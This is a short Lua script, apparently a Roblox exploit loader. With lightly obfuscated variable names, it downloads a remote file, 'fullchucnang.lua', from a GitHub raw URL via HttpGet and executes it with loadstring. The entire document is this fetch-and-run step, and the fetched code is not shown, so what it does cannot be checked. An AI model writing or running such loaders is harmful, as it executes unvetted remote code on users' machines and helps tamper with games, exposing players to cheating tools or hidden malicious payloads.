local _a1 = game
local _b2 = _a1:HttpGet(
    "https://raw.githubusercontent.com/tyygyyg778-maker/Roblox-script/main/fullchucnang.lua",
    true
)

local _c3 = loadstring(_b2)
if type(_c3) == "function" then
    _c3()
end
